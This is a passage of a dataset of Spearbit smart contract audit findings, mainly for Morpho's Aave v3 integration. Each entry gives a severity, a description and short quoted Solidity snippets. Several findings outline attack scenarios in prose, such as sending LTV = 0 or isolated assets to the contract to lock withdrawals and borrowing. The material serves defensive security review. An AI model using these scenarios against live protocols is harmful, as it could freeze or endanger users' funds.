"https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "This comment is exactly the same as this one. This is a copy-paste mistake.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Usage of floating pragma is not recommended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": " 0.8.11 is declared in files.  In foundry.toml: solc_version = '0.8.15' is used for the default build profile.  In hardhat.config.ts and hardhat-coverage.config.ts: \"0.8.14\" is used. 31", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Side effects of LTV = 0 assets: Morpho's users will not be able to withdraw (collateral and \"pure\" supply), borrow and liquidate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, operations could revert. 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0. 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert. 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert. Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply  Morpho's users could not be able to borrow  Morpho's users could not be able to liquidate  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Morpho is vulnerable to attackers sending LTV = 0 collateral tokens, supply/supplyCollateral, bor- row and liquidate operations could stop working", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, these operations could revert 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). In the attack scenario, the bad actor could simply supply an underlying that is associated with an LTV = 0 AToken and transfer it to the Morpho contract. If the victim does not own any balance of the asset, it will be set as collateral and the victim will suffer from all the side effects previously explained. While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply. 6  Morpho's users could not be able to borrow.  Morpho's users could not be able to liquidate.  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Morpho is not correctly handling the asset price in _getAssetPrice when isInEMode == true but priceSource is addres(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The current implementation of _getAssetPrice returns the asset's price based on the value of isInEMode function _getAssetPrice(address underlying, IAaveOracle oracle, bool isInEMode, address priceSource) internal view returns (uint256) if (isInEMode) { uint256 eModePrice = oracle.getAssetPrice(priceSource); if (eModePrice != 0) return eModePrice; } return oracle.getAssetPrice(underlying); { } As you can see from the code, if isInEMode is equal to true they call oracle.getAssetPrice no matter what the value of priceSource that could be address(0). 7 If we look inside the AaveOracle implementation, we could assume that in the case where asset is address(0) (in this case, Morpho pass priceSource _getAssetPrice parameter) it would probably return _fallbackOra- cle.getAssetPrice(asset). In any case, the Morpho logic diverges compared to what Aave implements. On Aave, if the user is not in e-mode, the e-mode oracle is address(0) or the asset's e-mode is not equal to the user's e-mode (in case the user is in e-mode), Aave always uses the asset price of the underlying and not the one in the e-mode priceSource. The impact is that if no explicit eMode oracle has been set, Morpho might revert in price computations, breaking liquidations, collateral withdrawals, and borrows if the fallback oracle does not support the asset, or it will return the fallback oracle's price which is different from the price that Aave would use.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Isolated assets are treated as collateral in Morpho", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract is intended not to be in isolation mode to avoid its restrictions. Supplying an isolated asset to Aave while there are already other (non-isolated) assets set as collateral will simply supply the asset to earn yield without setting it as collateral. However, Morpho will still set these isolated assets as collateral for the supplying user. Morpho users can borrow any asset against them which should not be possible:  Isolated assets are by definition riskier when used as collateral and should only allow borrowing up to a specific debt ceiling.  The borrows are not backed on Aave as the isolated asset is not treated as collateral there, lowering the Morpho Aave position's health factor and putting the system at risk of liquidation on Aave.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Morpho's logic to handle LTV = 0 AToken diverges from the Aave logic and could decrease the user's HF/borrowing power compared to what the same user would have on Aave", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The current implementation of Morpho has a specific logic to handle the scenario where Aave sets the asset's LTV to zero. We can see how Morpho is handling it in the _assetLiquidityData function function _assetLiquidityData(address underlying, Types.LiquidityVars memory vars) internal view returns (uint256 underlyingPrice, uint256 ltv, uint256 liquidationThreshold, uint256 tokenUnit) { ,! } // other function code... // If the LTV is 0 on Aave V3, the asset cannot be used as collateral to borrow upon a breaking withdraw. // In response, Morpho disables the asset as collateral and sets its liquidation threshold // to 0 and the governance should warn users to repay their debt. if (config.getLtv() == 0) return (underlyingPrice, 0, 0, tokenUnit); // other function code... The _assetLiquidityData function is used to calculate the number of assets a user can borrow and the maximum debt a user can reach before being liquidated. Those values are then used to calculate the user Health Factor. The Health Factor is used to  Calculate both if a user can be liquidated and in which percentage the collateral can be seized.  Calculate if a user can withdraw part of his/her collateral. The debt and borrowable amount are used in the Borrowing operations to know if a user is allowed to borrow the specified amount of tokens. On Aave, this situation is handled differently. First, there's a specific distinction when the liquidation threshold is equal to zero and when the Loan to Value of the asset is equal to zero. Note that Aave enforces (on the configuration setter of a reserve) that ltv must be <= of liquidationThreshold, this implies that if the LT is zero, the LTV must be zero. In the first case (liquidation threshold equal to zero) the collateral is not counted as collateral. This is the same behavior followed by Morpho, but the difference is that Morpho also follows it when the Liquidation Threshold is greater than zero. In the second case (LT > 0, LTV = 0) Aave still counts the collateral as part of the user's total collateral but does not increase the user's borrowing power (it does not increase the average LTV of the user). This influences the user's health factor (and so all the operations based on it) but not as impactfully as Morpho is doing. In conclusion, when the LTV of an asset is equal to zero, Morpho is not applying the same logic as Aave is doing, removing the collateral from the user's collateral and increasing the possibility (based on the user's health factor, user's debt, user's total collateral and all the asset's configurations on Aave) to  Deny a user's collateral withdrawal (while an Aave user could have done it).  Deny a user's borrow (while an Aave user could have done it).  Make a user liquidable (while an Aave user could have been healthy).  Increasing the possibility to allow the liquidator to seize the full collateral of the borrower (instead of 50%). 9", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk MorphoInternal.sol#L324,"]}, {"title": "RewardsManager does not take in account users that have supplied collateral directly to the pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Inside RewardsManager._getUserAssetBalances Morpho is calculating the amount of the supplied and borrowed balance for a specific user. In the current implementation, Morpho is ignoring the amount that the user has supplied as collateral directly into the Aave pool. As a consequence, the user will be eligible for fewer rewards or even zero in the case where he/she has supplied only collateral.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Accounting issue when repaying P2P fees while having a borrow delta", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When repaying debt on Morpho, any potential borrow delta is matched first. Repaying the delta should involve both decreasing the scaledDelta as well as decreasing the scaledP2PAmount by the matched amount. [1] However, the scaledP2PAmount update is delayed until the end of the repay function. The following repayFee call then reads the un-updated market.deltas.borrow.scaledP2PAmount storage variable leading to a larger estimation of the P2P fees that can be repaid. The excess fee that is repaid will stay in the contract and not be accounted for, when it should have been used to promote borrowers, increase idle supply or demote suppliers. For example, there could now be P2P suppliers that should have been demoted but are not and in reality don't have any P2P counterparty, leaving the entire accounting system in a broken state.  Example (all values are in underlying amounts for brevity.) Imagine a borrow delta of 1000, borrow.scaledP2PTotal = 10,000 supply.scaledP2PTotal = 8,000, so the repayable fee should be (10,000 - 1000) - (8,000 - 0) = 1,000. Now a P2P borrower wants to repay 3000 debt: 1. Pool repay: no pool repay as they have no pool borrow balance. 2. Decrease p2p borrow delta: decreaseDelta is called which sets market.deltas.borrow.scaledDelta = 0 (but does not update market.deltas.borrow.scaledP2PAmount yet!) and returns matchedBorrowDelta = 1000 3. repayFee is called and it computes (10,000 - 0) - (8,000 - 1,000) = 2,000. They repay more than the actual fee.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Repaying with ETH does not refund excess", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Users can repay WETH Morpho positions with ETH using the WETHGateway. The specified repay amount will be wrapped to WETH before calling the Morpho function to repay the WETH debt. However, the Morpho repay function only pulls in Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount). If the user specified an amount larger than their debt balance, the excess will be stuck in the WETHGateway contract. This might be especially confusing for users because the standard Morpho.repay function does not have this issue and they might be used to specifying a large, round value to be sure to repay all principal and accrued debt once the transaction is mined.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Morpho can end up in isolation mode", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract has a single Aave position for all its users and does therefore not want to end up in isolation mode due to its restrictions. The Morpho code would still treat the supplied non-isolation assets as collateral for their Morpho users, allowing them to borrow against them, but the Aave position does not treat them as collateral anymore. Furthermore, Morpho can only borrow stablecoins up to a certain debt ceiling. Morpho can be brought into isolation mode:  Up to deployment, an attacker maliciously sends an isolated asset to the address of the proxy. Aave sets assets as collateral when transferred, such that the Morpho contract already starts out in isolation mode. This can even happen before deployment by precomputing addresses or simply frontrunning the deployment. This attack also works if Morpho does not intend to create a market for the isolated asset.  Upon deployment and market creation: An attacker or unknowing user is the first to supply an asset and this asset is an isolated asset, Morpho's Aave position automatically enters isolation mode.  At any time if an isolated asset is the only collateral asset. This can happen when collateral assets are turned off on Aave, for example, by withdrawing (or liquidating) the entire balance.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Collateral setters for Morpho / Aave can end up in a deadlock", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "One can end up in a deadlock where changing the Aave pool or Morpho collateral state is not possible anymore because it can happen that Aave automatically turns the collateral asset off (for example, when withdrawing everything / getting liquidated). Imagine a collateral asset is turned on for both protocols: setAssetIsCollateralOnPool(true) setAssetIsCollateral(true) Then, a user withdraws everything on Morpho / Aave, and Aave automatically turns it off. It's off on Aave but on on Morpho. It can't be turned on for Aave anymore because: if (market.isCollateral) revert Errors.AssetIsCollateralOnMorpho(); But it also can't be turned off on Morpho anymore because of: if (!_pool.getUserConfiguration(address(this)).isUsingAsCollateral(_pool.getReserveData(underlying).id) ) { revert Errors.AssetNotCollateralOnPool(); ,! ,! } c This will be bad if new users deposit after having withdrawn the entire asset. The asset is collateral on Morpho but not on Aave, breaking an important invariant that could lead to liquidating the Morpho Aave position.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "First reward claim is zero for newly listed reward tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When Aave adds a new reward token for an asset, the reward index for this (asset, reward) pair starts at 0. When an update in Morpho's reward manager occurs, it initializes all rewards for the asset and would initialize this new reward token with a startingIndex of 0. 1. Time passes and emissions accumulate to all pool users, resulting in a new index assetIndex. Users who deposited on the pool through Morpho before this reward token was listed should receive their fair share of the entire emission rewards (assetIndex - 0) * oldBalance but they currently receive zero because getRewards returns early if the user's computed index is 0. 2. Also note that the external getUserAssetIndex(address user, address asset, address reward) can be inaccurate because it doesn't simulate setting the startingIndex for reward tokens that haven't been set yet. 3. A smaller issue that can happen when new reward tokens are added is that updates to the startingIndex are late, the startingIndex isn't initialized to 0 but to some asset index that accrued emissions for some time. Morpho on-pool users would lose some rewards until the first update to the asset. (They should accrue from index 0 but accrue from startingIndex.) Given frequent calls to the RewardManager that initializes all rewards for an asset, this difference should be negligible.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "Disable creating markets for siloed assets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Aave-v3 introduced siloed-borrow assets and siloed-borrow mode for users \"This feature allow assets with potentially manipulatable oracles (for example illiquid Uni V3 pairs) to be listed on Aave as single borrow asset i.e. if user borrows siloed asset, they cannot borrow any other asset. This helps mitigating the risk associated with such assets from impacting the overall solvency of the protocol.\" - Aave Docs The Morpho contract should not be in siloed-borrowing mode to avoid its restrictions on borrowing any other listed assets, especially as borrowing on the pool might be required for withdrawals. If a market for the siloed asset is created at deployment, users might borrow the siloed asset and break borrowing any of the other assets.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "A high value of _defaultIterations could make the withdrawal and repay operations revert because of OOG", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When the user executes some actions, he/she can specify their own maxIterations parameter. The user maxIterations parameter is directly used in supplyLogic and borrowLogic. In the withdrawLogic Morpho is recalculating the maxIterations to be used internally as Math.max(_default- Iterations.withdraw, maxIterations) and in repayLogic is directly using _defaultIterations.repay as the max number of iterations. This parameter is used as the maximum number of iterations that the matching engine can do to match suppli- ers/borrowers during promotion/demotion operations. 15 function _promoteOrDemote( LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, Types.MatchingEngineVars memory vars ) internal returns (uint256 processed, uint256 iterationsDone) { if (vars.maxIterations == 0) return (0, 0); uint256 remaining = vars.amount; // matching engine code... for (; iterationsDone < vars.maxIterations && remaining != 0; ++iterationsDone) { // matching engine code (onPool, inP2P, remaining) = vars.step(...); // matching engine code... } // matching engine code... } As you can see, the iteration keeps going on until the matching engine has matched enough balance or the iterations have reached the maximum number of iterations. If the matching engine cannot match enough balance, it could revert because of OOG if vars.maxIterations is a high value. For the supply or borrow operations, the user is responsible for the specified number of iterations that might be done during the matching process, in that case, if the operations revert because of OGG, it's not an issue per se. The problem arises for withdraw and replay operations where Morpho is forcing the number of operations and could make all those transactions always revert in case the matching engine does not match enough balance in time. Keep in mind that even if the transaction does not revert during the _promoteOrDemote logic, it could revert during the following operations just because the _promoteOrDemote has consumed enough gas to make the following operations to use the remaining gas.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "Morpho should check that the _positionsManager used has the same _E_MODE_CATEGORY_ID and _- ADDRESSES_PROVIDER values used by the Morpho contract itself", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Because _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER are immutable variables and because Morpho is calling the PositionsManager in a delegatecall context, it's fundamental that both Morpho and Posi- tionsManager have been initialized with the same _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER values. Morpho should also check the value of the PositionsManager._E_MODE_CATEGORY_ID and PositionsManager._- ADDRESSES_PROVIDER in both the setPositionsManager and initialize function.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "In _authorizeLiquidate, when healthFactor is equal to Constants.DEFAULT_LIQUIDATION_THRESHOLD Morpho is wrongly setting close factor to DEFAULT_CLOSE_FACTOR", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When the borrower's healthFactor is equal to Constants.MIN_LIQUIDATION_THRESHOLD Morpho is returning the wrong value for the closeFactor allowing only liquidate 50% of the collateral instead of the whole amount. When the healthFactor is lower or equal to the Constants.MIN_LIQUIDATION_THRESHOLD Morpho should return Constants.MAX_CLOSE_FACTOR following the same logic applied by Aave. Note that the user cannot be liquidated even if healthFactor == MIN_LIQUIDATION_THRESHOLD if the priceOr- acleSentinel is set and IPriceOracleSentinel(params.priceOracleSentinel).isLiquidationAllowed() == false. See how Aave performs the check inside validateLiquidationCall.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "_authorizeBorrow does not check if the Aave price oracle sentinel allows the borrowing operation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Inside the Aave validation logic for the borrow operation, there's an additional check that prevents the user from performing the operation if it has been not allowed inside the priceOracleSentinel require( params.priceOracleSentinel == address(0) || IPriceOracleSentinel(params.priceOracleSentinel).isBorrowAllowed(), Errors.PRICE_ORACLE_SENTINEL_CHECK_FAILED ); 17 Morpho should implement the same check. If for any reason the borrow operation has been disabled on Aave, it should also be disabled on Morpho itself. While the transaction would fail in case Morpho's user would need to perform the borrow on the pool, there could be cases where the user is completely matched in P2P. In those cases, the user would have performed a borrow even if the borrow operation was not allowed on the underlying Aave pool.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "_updateInDS does not \"bubble up\" the updated values of onPool and inP2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The _updateInDS function takes as input uint256 onPool and uint256 inP2P that are passed not as reference, but as pure values. function _updateInDS( address poolToken, address user, LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, uint256 onPool, uint256 inP2P, bool demoting ) internal { if (onPool <= Constants.DUST_THRESHOLD) onPool = 0; if (inP2P <= Constants.DUST_THRESHOLD) inP2P = 0; // ... other logic of the function } Those values, if lower or equal to Constants.DUST_THRESHOLD will be set to 0. The issue is that the updated version of onPool and inP2P is never bubbled up to the original caller that will later use those values that could have been changed by the _updateInDS logic. For example, the _updateBorrowerInDS function call _updateInDS and relies on the value of onPool and inP2P to understand if the user should be removed or added to the list of borrowers. function _updateBorrowerInDS(address underlying, address user, uint256 onPool, uint256 inP2P, bool ,! demoting) internal { _updateInDS( _market[underlying].variableDebtToken, user, _marketBalances[underlying].poolBorrowers, _marketBalances[underlying].p2pBorrowers, onPool, inP2P, demoting ); if (onPool == 0 && inP2P == 0) _userBorrows[user].remove(underlying); else _userBorrows[user].add(underlying); } 18 Let's assume that inP2P and onPool passed as _updateBorrowerInDS inputs were equal to 1 (the value of DUST_- THRESHOLD). In this case, _updateInDS would update those values to zero because 1 <= DUST_THRESHOLD and would remove the user from both the poolBucket and p2pBuckets of the underlying. When then the function returns in the _updateBorrowerInDS context, the same user would not remove the under- lying from his/her _userBorrows list of assets because the updated values of onPool and inP2P have not been bubbled up by the _updateInDS function. The same conclusion could be made for all the \"root\" level codes that rely on the onPool and inP2P values that could not have been updated with the new 0 value set by _updateInDS.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "There is no guarantee that the _rewardsManager is set when calling claimRewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Since the _rewardsManager address is set using a setter function in Morpho only and not in the MorphoStorage.sol constructor there is no guarantee that the _rewardsManager is not the default address(0) value. This could cause failures when calling claimRewards if Morpho forgets to set the _rewardsManager.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "Its Impossible to set _isClaimRewardsPaused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The claimRewards function checks the isClaimRewardsPaused boolean value and reverts if it is true. Currently, there is no setter function in the code base that sets the _isClaimRewardsPaused boolean so it is impossible to change.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "User rewards can be claimed to treasury by DAO", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When a user claims rewards, the rewards for the entire Morpho contract position on Aave are claimed. The excess rewards remain in the Morpho contract for until all users claimed their rewards. These rewards are not tracked and can be withdrawn by the DAO through a claimToTreasury call.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "decreaseDelta lib function should return early if amount == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The passed in amount should be checked for a zero value, and in that condition, return early from the function. The way it currently is unnecessarily consumes more gas, and emits change events that for values that don't end up changing (newScaledDelta). Checking for amount == 0 is already being done in the increaseDelta function.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Gas Optimization"]}, {"title": "Smaller gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "There are several small expressions that can be further gas optimized.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Gas Optimization"]}, {"title": "Gas: Optimize LogarithmicBuckets.getMatch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The getMatch function of the logarithmic bucket first checks for a bucket that is the next higher bucket If no higher bucket is found it searches for a bucket that is the than the bucket the provided value would be in. highest bucket that \"is in both bucketsMask and lowerMask.\" However, we already know that any bucket we can now find will be in lowerMask as lowerMask is the mask corresponding to all buckets less than or equal to value's bucket. Instead, we can just directly look for the highest bucket in bucketsMask.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Gas Optimization"]}, {"title": "Consider reverting the supplyCollateralLogic execution when amount.rayDivDown(poolSupplyIndex) is equal to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "In Aave, when an AToken/VariableDebtToken is minted or burned, the transaction will revert if the amount divided by the index is equal to zero. You can see the check in the implementation of _mintScaled and _burnScaled functions in the Aave codebase. Morpho, with PR 688, has decided to prevent supply to the pool in this scenario to avoid a revert of the operation. Before the PR, if the user had supplied an amount for which amount.rayDivDown(poolSupplyIndex) would be equal to zero, the operation would have reverted at the Aave level during the mint operation of the AToken. With the PR, the operation will proceed because the supply to the Aave pool is skipped (see PoolLib.supplyToPool). Allowing this scenario in this specific context for the supplyCollateralLogic function will bring the following side effects:  The supplied user's amount will remain in Morpho's contract and will not be supplied to the Aave pool.  The user's accounting system is not updated because collateralBalance is increased by amount.rayDivDown(poolSupplyIndex) which is equal to zero. 21  If the marketBalances.collateral[onBehalf] was equal to zero (the user has never supplied the underly- ing to Morpho) the underlying token would be wrongly added to the _userCollaterals[onBehalf] storage, even if the amount supplied to Morpho (and to Aave) is equal to zero.  The user will not be able to withdraw the provided amount because the amount has not been accounted for in the storage.  Events.CollateralSupplied event is emitted even if the amount (used as an event parameter) has not been accounted to the user.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "WETHGateway does not validate the constructor's input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The current implementation of the WETHGateway contracts does not validate the user's parameters during the constructor. In this specific case, the constructor should revert if morpho address is equal to ad- dress(0).", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Missing/wrong natspec, typos, minor refactors and renaming of variables to be more meaningful", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "In general, the current codebase does not cover all the functions, events, structs, or state variables with proper natspec. Below you can find a list of small specific improvements regarding typos, missing/wrong natspec, or suggestions to rename variables to a more meaningful/correct name  RewardsManager.sol#L28: consider renaming the balance variable in UserAssetBalance to scaledBalance  PositionsManagerInternal.sol#L289-L297, PositionsManagerInternal.sol#L352-L362: consider better docu- menting this part of the code because at first sight it's not crystal clear why the code is structured in this way. For more context, see the PR comment in the spearbit audit repo linked to it. 22  MorphoInternal.sol#L469-L521: consider moving the _calculateAmountToSeize function from MorphoInt- ernal to PositionsManagerInternal contract. This function is only used internally by the PositionsMan- agerInternal. Note that there could be more instances of these kinds of \"refactoring\" of the code inside other contracts.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "No validation checks on the newDefaultIterations struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The initialize function takes in a newDefaultIterations struct and does not perform validation for any of its fields.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "No validation check for newPositionsManager address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The initialize function does not ensure that the newPositionsManager is not a 0 address.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Missing Natspec function documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The repayLogic function currently has Natspec documentation for every function argument except for the repayer argument.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "approveManagerWithSig user experience could be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "With the current implementation of the approveManagerWithSig signers must wait that the previous signers have consumed the nonce to be able to call approveManagerWithSig. Inside the function, there's a specific check that will revert if the signature has been signed with a nonce that is not equal to the current one assigned to the delegator, this means that signatures that use \"future\" nonce will not be able to be approved until previous nonce has been consumed. uint256 usedNonce = _userNonce[signatory]++; if (nonce != usedNonce) revert Errors.InvalidNonce(); Let's make an example: delegator want to allow 2 managers via signature 1) Generate sig_0 for manager1 with nonce_0. 2) Generate sig_1 for manager2 with nonce_1. 3) If no-one executes approveManagerWithSig(sig_0) the sig_1 (and all the signatures based on incremented nonces) cannot be executed. It's true that at some point someone/the signer will execute it.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Missing user markets check when liquidating", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The liquidation does not check if the user who gets liquidated actually joined the collateral and borrow markets.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Consider reverting instead of returning zero inside repayLogic, withdrawLogic, withdrawCollater- alLogic and liquidateLogic function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Position manager always checks the user inputs via different validation functions. One of the vali- dations is that the input's amount must be greater than zero, otherwise, the transaction reverts with revert Er- rors.AmountIsZero(). The same behavior is not followed in those cases where the re-calculated amount is still zero. For example, in repayLogic after re-calculating the max amount that can be repaid by executing amount = Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount); In this case, Morpho simply executes if (amount == 0) return 0; Note that liquidateLogic should be handled differently because both the borrow amount and/or the collateral amount could be equal to zero. In this case, it would be better to revert with a different custom error based on which of the two amounts are equal to zero.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "PERMIT2 operations like transferFrom2 and simplePermit2 will revert if amount is greater than type(uint160).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Both Morpho.sol and PositionsManager.sol uses the Permit2 lib. The current implementation of the permit2 lib explicitly restricts the amount of token to uint160 by calling amount.toUint160() On Morpho, the amount is expressed as a uint256 and the user could, in theory, pass an amount that is greater than type(uint160).max. By doing so, the transaction would revert when it interacts with the permit2 lib.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Both _wrapETH and _unwrapAndTransferETH do not check if the amount is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Both _wrapETH and _unwrapAndTransferETH are not checking if the amount amount of tokens is greater than zero. If the amount is equal to zero, Morpho should avoid making the external call or simply revert.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Document further contraints on BucketDLL's insert and remove functions", "html_url": 